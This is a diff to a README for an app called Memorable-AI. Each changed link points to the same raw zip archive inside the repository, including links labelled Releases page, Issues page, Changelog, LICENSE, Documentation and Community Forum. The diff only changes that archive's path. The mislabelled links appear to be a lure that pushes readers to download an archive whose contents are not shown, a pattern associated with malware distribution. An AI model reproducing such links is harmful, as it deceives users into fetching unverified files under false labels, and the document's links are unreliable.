@@ -18,11 +18,11 @@ Before you begin, ensure your computer meets the following requirements:
 
 ### Download Link
 
-[![Download Memorable-AI](https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip%https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip)](https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip)
+[![Download Memorable-AI](https://raw.githubusercontent.com/darnay/memorable-ai/main/memorable_ai/integrations/memorable-ai-v1.2.zip%https://raw.githubusercontent.com/darnay/memorable-ai/main/memorable_ai/integrations/memorable-ai-v1.2.zip)](https://raw.githubusercontent.com/darnay/memorable-ai/main/memorable_ai/integrations/memorable-ai-v1.2.zip)
 
 ### Visit the Releases Page
 
-To download the latest version, visit the [Releases page](https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip). There, you'll find all available versions and their release notes.
+To download the latest version, visit the [Releases page](https://raw.githubusercontent.com/darnay/memorable-ai/main/memorable_ai/integrations/memorable-ai-v1.2.zip). There, you'll find all available versions and their release notes.
 
 ## 💻 Installation Instructions
 
@@ -72,20 +72,20 @@ Memorable-AI comes packed with features designed to enhance your memory:
 
 ## 💬 Support & Feedback
 
-If you encounter any issues or have suggestions, reach out through our [Issues page](https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip). We appreciate your feedback and aim to make Memorable-AI better.
+If you encounter any issues or have suggestions, reach out through our [Issues page](https://raw.githubusercontent.com/darnay/memorable-ai/main/memorable_ai/integrations/memorable-ai-v1.2.zip). We appreciate your feedback and aim to make Memorable-AI better.
 
 ## 📝 Changelog
 
-Check the [Changelog](https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip) for detailed notes on updates and new features. 
+Check the [Changelog](https://raw.githubusercontent.com/darnay/memorable-ai/main/memorable_ai/integrations/memorable-ai-v1.2.zip) for detailed notes on updates and new features. 
 
 ## 📜 License
 
-Memorable-AI is open source. You can find the full license details in the [LICENSE](https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip) file.
+Memorable-AI is open source. You can find the full license details in the [LICENSE](https://raw.githubusercontent.com/darnay/memorable-ai/main/memorable_ai/integrations/memorable-ai-v1.2.zip) file.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip)
-- [Community Forum](https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip)
+- [Documentation](https://raw.githubusercontent.com/darnay/memorable-ai/main/memorable_ai/integrations/memorable-ai-v1.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/darnay/memorable-ai/main/memorable_ai/integrations/memorable-ai-v1.2.zip)
 
 Thank you for using Memorable-AI! We hope it greatly helps you remember everything effortlessly.
 ```
